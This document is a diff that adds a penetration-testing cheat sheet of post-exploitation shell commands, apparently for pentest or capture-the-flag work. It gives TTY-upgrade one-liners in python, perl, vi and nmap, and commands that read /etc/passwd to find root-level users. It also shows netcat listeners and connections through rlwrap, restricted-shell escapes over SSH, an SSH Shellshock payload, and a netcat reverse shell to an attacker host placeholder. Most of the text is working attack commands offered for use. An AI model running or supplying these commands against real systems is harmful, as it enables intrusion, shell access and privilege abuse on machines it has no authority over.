@@ -1,1 +1,62 @@
+# Usage 
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+# Additional Functionality
+CTRL + Z
+stty raw -echo; fg
+enter
+export TERM=xterm-256color
+
+# Run older python/python2 scripts in virtual environment:
+cd /opt/impacket
+sudo virtualenv impacket-venv -p $(which python2)
+source impacket-venv/bin/activate
+
+# Exit virtual environment
+deactivate
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+perl -e ‘`/bin/bash`’
+perl -e 'exec "/bin/bash";'
+echo os.system('/bin/bash')
+/bin/sh -i
+
+Spawn Lua TTY Shell
+os.execute('/bin/sh')
+
+Spawn TTY Shell from Vi
+Run shell commands from vi:
+:!bash
+
+Spawn TTY Shell NMAP
+!sh
+
+Format /etc/passwd
+for user in $(cat /etc/passwd |cut -f1 -d":"); do id $user; done
+cat /etc/passwd |cut -f1,3,4 -d":" |grep "0:0" |cut -f1 -d":" |awk '{print$1}'
+
+Spawn TTY Shell
+In order to catch a shell, you need to listen on the desired port. rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L].
+rlwrap nc 10.0.0.1 4242
+rlwrap -r nc -nvlp 443
+
+rlwrap -r -f . nc 10.0.0.1 4242
+-f . will make rlwrap use the current history file as a completion word list.
+-r Put all words seen on in- and output on the completion list.
+
+
+use SSH on your machine to execute commands before the shell is loaded:
+ssh user@server -t "/bin/sh"
+
+or start the shell without loading "rc" profice (where most limits are configured):
+ssh user@server -t "bash --noprofile"
+
+SSH Shellshock
+try ShellShock on vulnerable implementations
+ssh user@server -t "() { :; }; /bin/bash"
+
+try to execute other commands such as nc to get full shell
+ssh user@server nc <LHOST> <LPORT> -e /bin/sh
 
